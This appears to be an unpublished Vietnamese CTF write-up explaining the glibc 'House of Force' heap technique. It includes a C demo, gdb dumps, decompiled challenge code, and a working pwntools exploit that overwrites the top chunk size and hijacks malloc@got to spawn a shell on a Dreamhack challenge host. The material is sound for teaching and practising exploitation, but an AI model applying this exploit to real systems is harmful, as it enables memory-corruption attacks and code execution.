---
title: House of force
date: 2025-02-12 00:00:00 +0800
categories: [pwn]
tags: [heap,House of force]
author: "kuvee"
layout: post
published: false
---

điều kiện cần : 


> có thể kiểm sóat được size của top chunk 
> có khả năng malloc() với size unlimited


## giới thiệu

- đây là 1 kĩ thuật liên quan đến quá trình xử lí top chunk của glibc  . theo kiến thức trước đây , ta biết rằng khi các bin không thể đáp ứng nhu cầu của yêu cầu phân bổ , kích thước tương ứng sẽ được tách ra từ heap
- vậy điều gì sẽ xảy ra khi khối heap được phân bổ bằng cách sử dụng top_chunk là 1 giá trị tùy ý do người dùng kiểm soát?  nó sẽ khiến top chunk trỏ tới bất kì vị trí nào chúng ta muốn , tương đương với 1 ghi vào một địa chỉ tùy ý 

kịch bản: 

```
thay đổi size của top chunk thành -1  
malloc() đến địa chỉ tiếp theo mà ta muốn ghi 
```

demo:

```cs
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        
    malloc(-4120); 
    malloc(0x10);   
}
```

đầu tiên malloc 1 chunk có size là 0x10  

```cs
0x602000:   0x0000000000000000  0x0000000000000021 <=== ptr
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 <=== top chunk
0x602030:   0x0000000000000000  0x0000000000000000
```

- tiếp theo thay đổi kích thước của top chunk bằng -1 

```cs
0x602000:   0x0000000000000000  0x0000000000000021 <=== ptr
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0xffffffffffffffff <=== top chunk size
0x602030:   0x0000000000000000  0x0000000000000000
```

- tiếp theo là phân bổ đến nơi ta muốn đến bằng cách malloc(-4120) , ta phải xác định mục tiêu của ta , ở đây mục tiêu sẽ là ```malloc@got.plt```

```cs
0x7ffff7dd1b20 <main_arena>:    0x0000000100000000  0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000  0x0000000000602020 <=== top chunk
0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78
```

```cs
0x601020:   0x00007ffff7a91130 <=== malloc@got.plt
```

- vì vậy ta sẽ trỏ top chunk tới 0x601010 để khi phân bổ 1 lần nữa , ta có thể malloc được ```malloc@got.plt``` , tiếp theo ta cần xác định địa chỉ của top chunk hiện tại . top chunk sẽ nằm ở ```0x602020``` , vậy offset được tính toán như sau:

0x601010-0x602020=-4112

- ngoài ra còn nhiều vấn đề malloc_align ở đây , nếu không phải malloc_align thì ta cần trừ nhiều hơn . 
- cuối cùng , ta thấy top chunk được nâng lên vị trí mà ta muốn

```cs
0x7ffff7dd1b20 <main_arena>:\   0x0000000100000000  0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000  0x0000000000601010 <=== 可以观察到top chunk被抬高
0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78
```

- cuối cùng ta sẽ phân bổ 1 chunk 0x10 , tức là ```0x0000000000601010``` và ta sẽ thay đổi nội dung của ```got```

## house_of_force 

- nói nhiều rồi nên giờ vào bài luôn cho nóng =)))

- bài này là 1 bài 32 bit

```cs
ploi@PhuocLoiiiii:~/pwn/Heap/House Of Force/house_of_force$ file house_of_force
house_of_force: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0d4e83dcce8b385638042e661ed2dc687e9597cf, not stripped
```

- ta sẽ có 2 option

```cs
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v5; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+4h] [ebp-Ch]
  int v7; // [esp+8h] [ebp-8h]
  unsigned int v8; // [esp+Ch] [ebp-4h]

  v8 = __readgsdword(0x14u);
  v6 = 0;
  v7 = 0;
  initialize();
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. Create");
      puts("2. Write");
      puts("3. Exit");
      printf("> ");
      __isoc99_scanf("%d", &v5);
      if ( v5 == 2 )
        break;
      if ( v5 == 3 )
        exit(0);
      if ( v5 == 1 )
      {
        v3 = v6++;
        create(v3);
        ++v6;
      }
    }
    if ( v7 )
      break;
    write_ptr();
    ++v7;
  }
  return -1;
}
```

- create : ta được malloc() 1 chunk với size tùy ý và nhập dữ liệu , in con trỏ và dữ liệu của chunk đó ra

```cs
int __cdecl create(int a1)
{
  size_t size[2]; // [esp+0h] [ebp-8h] BYREF

  size[1] = __readgsdword(0x14u);
  if ( a1 > 10 )
    return 0;
  printf("Size: ");
  __isoc99_scanf("%d", size);
  *(&ptr + a1) = malloc(size[0]);
  if ( !*(&ptr + a1) )
    return -1;
  printf("Data: ");
  read(0, *(&ptr + a1), size[0]);
  printf("%p: %s\n", *(&ptr + a1), (const char *)*(&ptr + a1));
  return 0;
}
```

- write_ptr: hàm này được input 3 lần , lần thứ nhất là idx của chunk , lần thứ 2 là tại vị trí nào của chunk và nó giới hạn <=0x64 , cuối cùng là gán dữ liệu vào chunk[idx] + where

```cs
int write_ptr()
{
  unsigned int v1; // [esp+0h] [ebp-10h] BYREF
  unsigned int v2; // [esp+4h] [ebp-Ch] BYREF
  _DWORD v3[2]; // [esp+8h] [ebp-8h] BYREF

  v3[1] = __readgsdword(0x14u);
  printf("ptr idx: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0xA )
    return -1;
  printf("write idx: ");
  __isoc99_scanf("%d", &v2);
  if ( v2 > 0x64 )
    return -1;
  printf("value: ");
  __isoc99_scanf("%u", v3);
  *((_DWORD *)*(&ptr + v1) + v2) = v3[0];
  return 0;
}
```

- vậy tóm lại ta được malloc 1 chunk với size tùy ý , ta cũng có thể ghi đè size của top chunk ở option2 và cuối cùng ta cũng có heap_leak , ta sẽ cần heap leak vì ta sẽ tính toán địa chỉ target trừ đi top_chunk address

- địa chỉ top chunk là ```0x996a1a8```

![here](/assets/images/heap/house_of_force/top.png)

- lúc này top_chunk đã bị thay đổi thành giá trị mong muốn

![here](/assets/images/heap/house_of_force/change.png)

- trong bài này sẽ có hàm get_shell sẵn cho ta , ta có thể target đến các got cũng được vì bài này RELRO 1 phần thôi

- vì bài này là 32 bit nên target sẽ được tính như sau:

```target_size = malloc@got - top_chunk_address - 8```  

nếu là 64bit thì trừ đi 16 

- baì này không overwrite exit@got được vì thằng system ở trước exit@got   , và nó sẽ bị hỏng



exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./house_of_force_patched',checksec=False)

#p = process()
p = remote('host1.dreamhack.games', 20770)

#gdb.attach(p,gdbscript='''
 #          b*0x08048864
 #          b*0x0804872c
 #          b*0x08048775
  #         ''')
input()
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'16')
p.sendlineafter(b'Data: ',b'a'*16)

leak_heap = p.recvuntil(b':')[:-1]
print(leak_heap)


top_chunk = int(leak_heap,16) + 20

log.info(f"top chunk: {hex(top_chunk)}")

#overwrite top chunk


input()
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'ptr idx: ',b'0')
p.sendlineafter(b'write idx: ',b'5')
p.sendlineafter(b'value: ',str(int(0xffffffff)))

target = exe.got.malloc
pause()
win = target - top_chunk - 8
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',str(int(win)))
p.sendlineafter(b'Data: ',b'a'*win)

input()
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", b"4")
p.sendlineafter(b"Data: ", p32(exe.sym.get_shell))


p.sendlineafter("> ", '1')
p.sendlineafter("Size: ", str(0x10))
p.interactive()

```

![here](/assets/images/heap/house_of_force/flagkaka.png)


## HITCONTRAINING LAP11 

- ta sẽ có 5 option ở bài này bao gồm : show , add , change , remove và gọi hàm goodbyte


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void (**v4)(void); // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v4 = (void (**)(void))malloc(0x10uLL);
  *v4 = (void (*)(void))hello_message;
  v4[1] = (void (*)(void))goodbye_message;
  (*v4)();
  while ( 1 )
  {
    menu();
    read(0, buf, 8uLL);
    switch ( atoi(buf) )
    {
      case 1:
        show_item();
        break;
      case 2:
        add_item();
        break;
      case 3:
        change_item();
        break;
      case 4:
        remove_item();
        break;
      case 5:
        v4[1]();
        exit(0);
      default:
        puts("invaild choice!!!");
        break;
    }
  }
}
```

- show_item: in dữ liệu ở mảng global này ra 

```c
int show_item()
{
  int i; // [rsp+Ch] [rbp-4h]

  if ( !num )
    return puts("No item in the box");
  for ( i = 0; i <= 99; ++i )
  {
    if ( *((_QWORD *)&unk_6020C8 + 2 * i) )
      printf("%d : %s", i, *((const char **)&unk_6020C8 + 2 * i));
  }
  return puts(byte_401089);
}
```

- add_item: ta sẽ được nhập vào 1 size tùy ý và malloc với size đó , tiếp theo là read dữ liệu vào

```c
__int64 add_item()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    if ( !v2 )
    {
      puts("invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !*((_QWORD *)&unk_6020C8 + 2 * i) )
      {
        *((_DWORD *)&itemlist + 4 * i) = v2;
        *((_QWORD *)&unk_6020C8 + 2 * i) = malloc(v2);
        printf("Please enter the name of item:");
        *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * i) + (int)read(0, *((void **)&unk_6020C8 + 2 * i), v2)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
```

- change_item: ta được nhập 1 idx và read dữ liệu vào chunk đó , tuy nhiên ở đây size input() do người dùng nhập -> heap overflow

```c
unsigned __int64 change_item()
{
  int v1; // [rsp+4h] [rbp-2Ch]
  int v2; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      printf("Please enter the length of item name:");
      read(0, nptr, 8uLL);
      v2 = atoi(nptr);
      printf("Please enter the new name of the item:");
      *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}

```

- remote_item: nhập 1 idx và xóa chunk đó đi , không xảy ra UAF


```c
unsigned __int64 remove_item()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      free(*((void **)&unk_6020C8 + 2 * v1));
      *((_QWORD *)&unk_6020C8 + 2 * v1) = 0LL;
      *((_DWORD *)&itemlist + 4 * v1) = 0;
      puts("remove successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v3;
}
```


- cuối cùng là option5 : nó sẽ gọi hàm ```goodbye_message```

```c
  case 5:
        v4[1]();
        exit(0);
```

- bài này đáp ứng điều kiện heap_overflow  , ta cũng có 1 hàm win ở bài này vì vậy đây sẽ là target của ta

```c
void __noreturn magic()
{
  int fd; // [rsp+Ch] [rbp-74h]
  char buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("/home/bamboobox/flag", 0);
  read(fd, buf, 0x64uLL);
  close(fd);
  printf("%s", buf);
  exit(0);
}
```

- vì vậy ta có thể dùng ```house_of_force``` để trỏ tới got hoặc là hàm ```goodbye_message``` và thay đổi nó thành target mà ta muốn để lấy flag

